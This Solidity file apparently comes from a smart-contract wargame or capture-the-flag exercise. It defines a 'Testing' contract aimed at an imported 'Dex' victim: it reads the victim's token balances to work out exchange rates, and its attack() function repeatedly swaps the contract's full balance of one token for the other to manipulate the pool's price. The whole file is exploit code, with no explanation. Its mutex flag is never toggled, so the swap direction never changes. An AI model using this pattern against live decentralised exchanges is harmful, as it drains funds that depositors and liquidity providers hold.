// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./vict.sol";

contract Testing {
    Dex public victimContract;
    address public victimAddress;
    address public token1address;
    address public token2address;
    bool public mutex = false;

    constructor(address _addr) {
        victimContract = Dex(_addr);
        victimAddress = _addr;
    }

    function setTokenAddresses(address addr1, address addr2) public {
        token1address = addr1;
        token2address = addr2;
    }

    function getBalances() public view returns (uint, uint) {
        uint myT1 = victimContract.balanceOf(token1address, address(this));
        uint myT2 = victimContract.balanceOf(token2address, address(this));
        return (myT1, myT2);
    }

    function getExchangeRates() public view returns (uint, uint) {
        uint T1Rate = victimContract.balanceOf(token1address, victimAddress);
        uint T2Rate = victimContract.balanceOf(token2address, victimAddress);

        //for T1  -->   T2   : Rate = count(T2) / Count(T1)
        //for T2  -->   T1   : Rate = count(T1) / Count(T2)

        return (T2Rate / T1Rate, T1Rate / T2Rate);
    }

    function attack() public {
        uint myT1 = victimContract.balanceOf(token1address, address(this));
        uint myT2 = victimContract.balanceOf(token2address, address(this));

        if (mutex) {
            //check the amount that we can exchange.
            //for this we have already calculated it above.

            //approve first.
            victimContract.approve(victimAddress, myT2);

            //swap
            victimContract.swap(token2address, token1address, myT2);
        } else {
            //approve first.
            victimContract.approve(victimAddress, myT1);

            //swap
            victimContract.swap(token1address, token2address, myT1);
        }
    }
}
